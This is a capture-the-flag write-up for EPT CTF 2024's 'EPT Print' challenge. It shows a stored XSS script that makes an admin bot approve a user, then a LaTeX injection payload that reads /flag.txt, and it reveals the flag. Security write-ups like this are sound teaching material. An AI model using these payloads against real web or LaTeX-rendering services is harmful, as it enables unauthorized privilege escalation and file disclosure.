# Writeup
By /dev/null TH٤ N١٥

## EPT Print
EPT Print was a web printing service which had a Flask-based backend allowing to which one could submit LaTeX code for typesetting and printing.
These prints could then be collected by scanning the Mifare tag on at the onsite printer.

Before one was allowed to print, one needed to be verified. The web UI featured a way to submit applications with a title and body. A user could see whether their application had been reviewed, i.e. if it had been opened.
In addition to the Flask server, there was also a bot running a headless browser that opened, i.e. reviewed (without accepting) the applications.

## Gaining verification
The first step to solving the challenge, was to become verified.
The web page has a content security policy allowing inline scripts to be executed.
From `__init__.py`
```py
    # Make sure we TRY to protect against dirty XSS attack
    # FIXME: remember to remove 'unsafe-inline' in script-src after testing
    script_src = "script-src 'self' 'unsafe-inline'"
    frame_src = "frame-src 'self'"
    if IS_PRODUCTION:
        script_src += " https://challenges.cloudflare.com"
        frame_src += " https://challenges.cloudflare.com"
```

There is also no sanitisation of the input from the users, allowing easy injection of code into the body of the application. These scripts will then be run by the admin bot while reviewing the application.

The application page for admins contains the following form
```html
<form method="POST" action="{{ url_for('approval.approve') }}">
    {{ form.hidden_tag() }}
    {{ form.user_id(value=application.user.id) }}
    <!-- Make it easy for the admin to click() the button by placing it at the top -->
    <button id="submit" type="submit" class="btn btn-primary">{{ form.submit.label }}</button>
</form>
```

Since this button is first in DOM, the script
```html
<script>
    document.querySelector("button").click();
</script>
```
can be added to the application body. The bot will then approve the user's application, allowing them to print.

## Extracting the flag

The second part of the task is to actually extract the flag, which is located in `/flag.txt`

LaTeX from the user is directly input into the template
```latex
\documentclass{article}
\usepackage{graphicx}
\usepackage{eso-pic}

\linespread{1.5}
\setlength{\parindent}{0pt}
\pagenumbering{gobble}
\title{EPT}
\author{klarz}

\AddToShipoutPictureBG*{
  \AtPageLowerLeft{
    \includegraphics[width=\paperwidth,height=\paperheight,keepaspectratio]{ept.png}
  }
}

\begin{document}

\null\hfill\begin{tabular}[t]{l@{}}
  \textbf{EPT CTF 2024} \\
  \textit{\today}
\end{tabular}

{\noindent\Large\bfseries\sffamily\color{red}{<PRINT_JOB_TITLE>}}
\vspace{3mm}

<PRINT_JOB_CONTENT>

\end{document}
```

This means we can inject any LaTeX code into the document part.

The file is then built using
```py
result = subprocess.run(
[
    "pdflatex",
    "--no-shell-escape",
    "-interaction=nonstopmode",
    "-halt-on-error",
    "-output-directory",
    latex_dir,
    latex_file,
],
```

This exposes multiple vulnerabilities including file system access.

LaTeX commands like `\input{/flag.txt}` would be able to read the contents of the flag.
Unfortunately, this command interprets the input as LaTeX, which cannot contain _ characters. This causes a build error.
Commands like `\lstinputlisting` or `\verbatiminput` would have solved this, but require the inclusion of external packages, which cannot be done inside the document.

The payload
```latex
        
\newread\file
\openin\file=/flag.txt
\loop\unless\ifeof\file
    \read\file to\fileline 
    \detokenize\expandafter{\fileline}
\repeat
\closein\file
```
was used. It reads the data into a variable, which it then processes in a way so that it will not be interpreted as LaTeX.

On the print, this will look like:
```
EPT–Y0U˙4R3˙4˙PR1NT3R˙M4ST3R˝ “par
```

which can be interpreted as the flag
```
EPT{Y0U_4R3_4_PR1NT3R_M4ST3R}
```
